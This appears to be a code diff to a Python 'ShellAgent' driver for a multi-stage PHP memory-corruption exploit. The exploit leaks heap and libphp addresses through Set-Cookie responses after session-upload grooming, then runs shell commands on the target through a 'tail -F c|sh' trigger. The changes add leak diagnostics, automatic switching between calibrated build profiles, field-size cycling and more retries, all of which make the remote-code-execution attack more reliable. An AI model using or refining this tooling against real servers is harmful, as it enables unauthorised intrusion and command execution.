@@ -43,17 +43,18 @@ import subprocess
 import sys
 import threading
 import time
-from collections import deque
+from collections import Counter, deque
 
 _HERE = os.path.dirname(os.path.abspath(__file__))
 sys.path.insert(0, _HERE)
 
 import exploit as ex  # noqa: E402
 
-# Diagnostic hook: remember the size of the last raw leak cookie so failed
-# stages can report WHY they failed (no Set-Cookie at all vs weak grooming).
+# Diagnostic hooks: remember what the last leak attempt actually saw so failed
+# stages can report WHY (no Set-Cookie at all vs short cookie vs weak pattern).
 _orig_parse_cookie = ex.parse_cookie
 _last_cookie_len = {"v": 0}
+_last_leak_stats: dict = {"checked": False, "ptrs": 0, "groups": 0, "best": 0}
 
 
 def _parse_cookie_diag(resp: bytes) -> bytes:
@@ -63,6 +64,43 @@ def _parse_cookie_diag(resp: bytes) -> bytes:
 
 
 ex.parse_cookie = _parse_cookie_diag
+
+_orig_chunk_base = ex.chunk_base_from_cookie
+
+
+def _chunk_base_diag(raw: bytes) -> int:
+    """Mirror of the stage-1 scoring, collecting stats along the way."""
+    _last_leak_stats.update({"checked": True, "ptrs": 0, "groups": 0, "best": 0})
+    if len(raw) >= 1000:
+        c: Counter[int] = Counter()
+        for i in range(len(raw) - 8):
+            v = int.from_bytes(raw[i:i + 8], "little")
+            if 0x7F0000000000 <= v < 0x800000000000:
+                c[v & ~0x1FFFFF] += 1
+        if c:
+            base, count = c.most_common(1)[0]
+            _last_leak_stats.update({"ptrs": sum(c.values()),
+                                     "groups": len(c), "best": count})
+    return _orig_chunk_base(raw)
+
+
+ex.chunk_base_from_cookie = _chunk_base_diag
+
+_orig_libphp_base = ex.libphp_base_from_cookie
+
+
+def _libphp_base_diag(raw: bytes, dtor_offset: int = ex.DTOR_OFFSET) -> int:
+    _last_leak_stats.update({"checked": True, "ptrs": 0, "groups": 0, "best": 0})
+    if len(raw) >= 16:
+        p = int.from_bytes(raw[8:16], "little")
+        if 0x7F0000000000 <= p < 0x800000000000:
+            _last_leak_stats.update({"ptrs": 1, "groups": 1, "best": 1,
+                                     "ptr": f"0x{p:x}",
+                                     "page_ok": p & 0xFFF == dtor_offset & 0xFFF})
+    return _orig_libphp_base(raw, dtor_offset)
+
+
+ex.libphp_base_from_cookie = _libphp_base_diag
 
 TAIL_TRIGGER = "tail -F c|sh"          # 12 bytes
 FETCH_NAME = "o"                        # webroot output file
@@ -251,6 +289,65 @@ class ShellAgent:
                      f"(currently {self.x.huge_mb}MB) must exceed the target "
                      "memory_limit, and max_input_vars should be 1000", "warn")
 
+    def _attempt_diag(self, stage: str) -> str:
+        """One-line per-attempt explanation of a missed leak; returns category."""
+        st = _last_leak_stats
+        n = _last_cookie_len["v"]
+        _last_leak_stats.pop("ptr", None)
+        _last_leak_stats.pop("page_ok", None)
+        if st.get("checked") and st.get("ptrs"):
+            extra = ""
+            if st.get("ptr") is not None:
+                extra = f", ptr={st['ptr']} page_ok={bool(st.get('page_ok'))}"
+            self.log(f"[-] {stage}: leak cookie {n}B, heap-ptr candidates "
+                     f"{st.get('ptrs')}, best 2MB group {st.get('best')} "
+                     f"(need >=8){extra}", "warn")
+            return "pattern"
+        if n > 0:
+            self.log(f"[-] {stage}: leak cookie only {n}B (<1000) - grooming "
+                     "missed the leak window this attempt", "warn")
+            return "short"
+        self.log(f"[-] {stage}: no Set-Cookie leak at all - the target ignored "
+                 "the session upload (wrong page? upload_progress disabled? "
+                 "post_max_size smaller than huge_mb?)", "warn")
+        return "none"
+
+    def _apply_profile(self, name: str) -> bool:
+        """Swap calibration tables to the other build profile at runtime."""
+        x = self.x
+        if x is None or x.profile == name:
+            return False
+        x.profile = name
+        if name == "bookworm":
+            x.stage1_n = ex.BOOKWORM_STAGE1_N
+            x.stage2_t = ex.BOOKWORM_STAGE2_T
+            x.stage2_v = ex.BOOKWORM_STAGE2_V
+            x.stage3_pads = list(ex.BOOKWORM_STAGE3_PADS)
+            x.stage3_carrier = True
+            ht = ex.BOOKWORM_HTDATA_OFFSET
+        else:
+            x.stage1_n = 892
+            x.stage2_t = 443
+            x.stage2_v = 1
+            x.stage3_pads = [(8, 7)] + [(7, 7)] * 5
+            x.stage3_carrier = False
+            ht = ex.HTDATA_OFFSET
+        if self.cfg.get("htdata_offset") is None:
+            x.htdata_offset = ht
+        self.log(f"[*] adaptive: switching build profile to '{name}' "
+                 f"(stage1_n={x.stage1_n})", "warn")
+        return True
+
+    def _adapt_huge_mb(self, category: str, misses: int) -> None:
+        """Cycle the OOM field size when the diagnostics point at it."""
+        base = int(self.cfg.get("huge_mb", 12) or 12)
+        cycle = [base] if category == "none" else (
+            [base, 7, 24] if category == "short" else [base, 24])
+        new = cycle[misses % len(cycle)]
+        if new != self.x.huge_mb:
+            self.x.huge_mb = new
+            self.log(f"[*] adaptive: huge_mb -> {new}MB", "warn")
+
     def run_stage3(self, cmd: str, read_cap: int = 1 << 20) -> bytes:
         """Mirror Exploit.stage3 but return the trigger request's raw response."""
         if len(cmd.encode()) > ex.MAX_CMD:
@@ -363,7 +460,7 @@ class ShellAgent:
         if not (self.t and self.x):
             return {"ok": False, "error": "not configured"}
 
-        retries = int(self.cfg.get("retries", 10))
+        retries = int(self.cfg.get("retries", 25))
 
         self.stage("preflight", "running")
         try:
@@ -384,6 +481,7 @@ class ShellAgent:
         self.stage("rotate", "done")
 
         self.stage("stage1", "running")
+        misses = 0
         for attempt in range(1, retries + 1):
             self.log(f"[*] stage 1: heap leak (attempt {attempt}/{retries})")
             try:
@@ -394,9 +492,17 @@ class ShellAgent:
             if self.chunk:
                 self.stage("stage1", "done", f"chunk base = 0x{self.chunk:x}")
                 break
+            misses += 1
             self.log("[-] heap leak missed", "warn")
+            category = self._attempt_diag("stage 1")
             if attempt < retries:
                 self.fresh_worker()
+                # The two calibrated builds use different field counts; if the
+                # chosen profile keeps missing, try the other one.
+                if misses == 3:
+                    other = "lab" if self.x.profile == "bookworm" else "bookworm"
+                    self._apply_profile(other)
+                self._adapt_huge_mb(category, misses)
         if not self.chunk:
             self.stage("stage1", "failed", "no 2MB-aligned chunk base in Set-Cookie")
             self._leak_diag("stage 1")
@@ -418,6 +524,7 @@ class ShellAgent:
                 self.stage("stage2", "done", f"libphp base = 0x{self.libphp:x}")
                 break
             self.log("[-] libphp leak missed", "warn")
+            self._attempt_diag("stage 2")
             if attempt < retries:
                 self.fresh_worker()
         if not self.libphp:
@@ -975,7 +1082,12 @@ def _serve(port: int) -> None:
                 pass
 
     while True:
-        sock, addr = srv.accept()
+        try:
+            sock, addr = srv.accept()
+        except OSError:
+            # e.g. transient EMFILE/EINTR - never let the accept loop kill the daemon
+            time.sleep(0.05)
+            continue
         ev.add(sock, f"{addr[0]}:{addr[1]}")
         threading.Thread(target=client_loop, args=(sock, f"{addr[0]}:{addr[1]}"),
                          daemon=True).start()
